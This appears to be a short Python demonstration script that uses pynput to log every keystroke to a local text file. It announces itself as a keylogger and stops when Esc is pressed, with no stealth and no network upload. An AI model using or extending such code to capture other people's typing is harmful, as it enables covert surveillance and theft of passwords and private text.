from pynput import keyboard

def on_press(key):
    try:
        with open("key_log.txt", "a") as log_file:
            # Log alphanumeric keys
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("key_log.txt", "a") as log_file:
            # Log special keys (e.g., Shift, Ctrl)
            log_file.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop the listener if the 'Esc' key is pressed
        print("Keylogger stopped.")
        return False

# Start the listener
print("Keylogger is running... Press 'Esc' to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
